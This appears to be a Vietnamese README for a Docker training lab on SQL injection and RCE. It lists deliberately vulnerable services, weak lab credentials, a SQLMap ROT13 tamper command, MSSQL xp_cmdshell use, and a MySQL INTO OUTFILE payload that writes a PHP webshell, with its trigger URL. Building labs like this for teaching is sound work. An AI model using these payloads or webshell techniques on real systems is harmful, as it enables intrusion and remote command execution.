# SQL Injection & RCE Workshop Lab

Một lab toàn diện về các lỗ hổng **SQL Injection** và **Remote Code Execution (RCE)** với các bài tập thực hành ngày càng nâng cao.

## 📋 Nội Dung Lab

### Task 2: Blind SQL Injection - Binary Search
- **Port Web**: 8002 | **Port DB**: 3302
- **Mục tiêu**: Khai thác blind SQL injection (Boolean-based) sử dụng kỹ thuật binary search
- **Kiến thức**:
  - Blind SQL injection (không hiển thị error)
  - Binary search để tối ưu hóa tốc độ trích xuất dữ liệu
  - Phân tích response để xác định true/false

### Task 3: SQLMap with ROT13 Encoding
- **Port Web**: 8003 | **Port DB**: 3303
- **Mục tiêu**: Bypass SQLMap bằng custom tamper script ROT13
- **Kiến thức**:
  - ROT13 encoding/decoding
  - Tạo custom tamper script cho SQLMap
  - Hiểu cơ chế quét của SQLMap

### Task 4: RCE with MSSQL
- **Case 1 - Same Server**:
  - Port Web: 8051 | Port DB: 14331
  - Web và MSSQL trên cùng 1 container
  - Sử dụng `xp_cmdshell` để execute commands
  
- **Case 2 - Different Server**:
  - Port Web: 8052 | Port DB: 14332
  - Web container riêng, MSSQL container riêng
  - Kết nối remote đến MSSQL

### Task 5: RCE with MySQL File Operations
- **Port Web**: 8006 | **Port DB**: 33066
- **Mục tiêu**: Khai thác SQL injection kết hợp với `INTO OUTFILE` để thực thi code
- **Kiến thức**:
  - MySQL `INTO OUTFILE` và `LOAD_FILE`
  - File write operations qua SQL injection
  - Shell webshell execution

---

## 🚀 Hướng Dẫn Chạy

### 1. Clone repository và vào thư mục
```bash
cd Task1Sqli
```

### 2. Khởi động tất cả services
```bash
# Start all containers
docker-compose up -d

# View logs
docker-compose logs -f

# Stop all containers
docker-compose down
```

### 3. Chạy từng task riêng lẻ
```bash
# Task 2 Binary Search
docker-compose up -d task2-web task2-db

# Task 3 SQLMap ROT13
docker-compose up -d task3-web task3-db

# Task 4 RCE MSSQL - Case 1
docker-compose up -d task4-case1-web task4-case1-mssql

# Task 4 RCE MSSQL - Case 2
docker-compose up -d task4-case2-web task4-case2-mssql

# Task 5 RCE MySQL File
docker-compose up -d task5-web task5-db
```

### 4. Truy cập ứng dụng
| Task | URL | DB Port |
|------|-----|---------|
| Task 2: Blind SQLi | http://localhost:8002 | 3302 |
| Task 3: SQLMap ROT13 | http://localhost:8003 | 3303 |
| Task 4 Case 1: RCE MSSQL (Same) | http://localhost:8051 | 14331 |
| Task 4 Case 2: RCE MSSQL (Diff) | http://localhost:8052 | 14332 |
| Task 5: RCE MySQL File | http://localhost:8006 | 33066 |

---

## 📁 Cấu Trúc Thư Mục

```
.
├── docker-compose.yml                    # Quản lý tất cả services
├── README.md                             # Tài liệu này
│
├── Task2_BinarySearch/                   # Blind SQLi - Binary Search
│   ├── web/
│   │   ├── Dockerfile
│   │   └── index.php                    # Chứa lỗi Boolean-based blind SQLi
│   ├── db/
│   │   └── init.sql                     # Tạo bảng heavy_data (50+ cột)
│   └── scripts/
│       └── exploit_binary_search.py     # Exploit script
│
├── Task3_SQLMap_ROT13/                   # SQLi + ROT13 Tamper
│   ├── web/
│   │   ├── Dockerfile
│   │   └── rot13_vuln.php               # Lỗi SQLi nhưng input qua ROT13
│   ├── db/
│   │   └── init.sql                     # Data mẫu
│   └── tamper/
│       └── rot13_tamper.py              # Custom tamper script cho SQLMap
│
├── Task4_RCE_MSSQL/                      # RCE via MSSQL xp_cmdshell
│   ├── case1_same_server/               # Web + MSSQL cùng container
│   │   ├── Dockerfile
│   │   ├── web_app/
│   │   │   └── index.php
│   │   └── init_db.sql                  # Bật xp_cmdshell
│   └── case2_diff_server/               # Web + MSSQL riêng container
│       ├── web/
│       │   ├── Dockerfile
│       │   └── index.php
│       └── db/
│           └── init_db.sql
│
└── Task5_RCE_MySQL_File/                 # RCE via MySQL INTO OUTFILE
    ├── web/
    │   ├── Dockerfile
    │   └── index.php                    # SQLi + file write capability
    └── db/
        ├── custom_mysql.cnf             # secure_file_priv=""
        └── init.sql
```

---

## 🔧 Thông Tin Kết Nối Database

### Task 2 Database
- **Host**: task2-db (từ container), localhost (từ host)
- **Port**: 3302
- **User**: root
- **Password**: password
- **Database**: blind_sqli_db

### Task 3 Database
- **Host**: task3-db (từ container), localhost (từ host)
- **Port**: 3303
- **User**: root
- **Password**: password
- **Database**: rot13_db

### Task 4 Case 1 MSSQL
- **Host**: localhost (integrated) trong container
- **Port**: 14331
- **User**: sa
- **Password**: P@ssw0rd123!
- **Info**: Web PHP chạy cùng container với MSSQL

### Task 4 Case 2 MSSQL
- **Host**: task4-case2-mssql (từ container), localhost (từ host)
- **Port**: 14332
- **User**: sa
- **Password**: P@ssw0rd123!

### Task 5 Database
- **Host**: task5-db (từ container), localhost (từ host)
- **Port**: 33066
- **User**: root
- **Password**: password
- **Database**: rce_file_db
- **secure_file_priv**: "" (cho phép ghi file)

---

## 💡 Hướng Dẫn Khai Thác

### Task 2: Blind SQLi Binary Search
```bash
# Chạy exploit script
cd Task2_BinarySearch/scripts
python3 exploit_binary_search.py --target http://localhost:8002 --param id
```

### Task 3: SQLMap với ROT13
```bash
# Copy tamper script vào SQLMap
cp Task3_SQLMap_ROT13/tamper/rot13_tamper.py /path/to/sqlmap/tamper/

# Chạy SQLMap với ROT13 tamper
sqlmap -u "http://localhost:8003/?id=1" --tamper=rot13_tamper -p id
```

### Task 4: RCE MSSQL
```bash
# Case 1: Direct connection (localhost)
# Truy cập http://localhost:8051 và submit command

# Case 2: Remote connection
# Truy cập http://localhost:8052 và thực thi remote commands
```

### Task 5: RCE MySQL File
```bash
# Payload tạo webshell:
# id=1' UNION SELECT 1,2,3,LOAD_FILE('/var/www/html/uploads/shell.php'),5 INTO OUTFILE '/var/www/html/shell.php' #

# Kích hoạt shell:
# http://localhost:8006/shell.php?cmd=id
```

---

## 📚 Khái Niệm Chính

- **Blind SQL Injection**: SQLi không hiển thị kết quả trực tiếp
- **Binary Search**: Tối ưu hóa tốc độ trích xuất dữ liệu nhị phân
- **ROT13 Obfuscation**: Mã hóa bypass các bộ lọc
- **xp_cmdshell**: Stored procedure MSSQL để thực thi commands
- **INTO OUTFILE**: MySQL directive để ghi dữ liệu ra file
- **Tamper Script**: Custom plugin SQLMap để bypass WAF/filters

---

## ⚠️ Lưu Ý Bảo Mật

**Đây là LAB GIÁO DỤC CHỈNH.** Không sử dụng trên hệ thống production.

- Tất cả mật khẩu đều yếu (chỉ cho development)
- Các lỗ hổng được cố ý để lại để học tập
- Sử dụng trong môi trường lab/training an toàn

---

## 🎯 Mục Tiêu Học Tập

1. ✅ Hiểu cơ chế SQL Injection
2. ✅ Kô phát exploit cho blind SQLi
3. ✅ Bypass filters sử dụng encoding
4. ✅ Khai thác RCE qua database primitives
5. ✅ Thực hành với các công cụ security (SQLMap)

---

## 📞 Hỗ Trợ

Nếu gặp vấn đề:
1. Kiểm tra logs: `docker-compose logs [service-name]`
2. Xóa và rebuild: `docker-compose down && docker system prune && docker-compose up`
3. Kiểm tra ports không bị chiếm dụng: `netstat -an | grep LISTEN`

---

**Last Updated**: 2024
**For Educational Purposes Only**
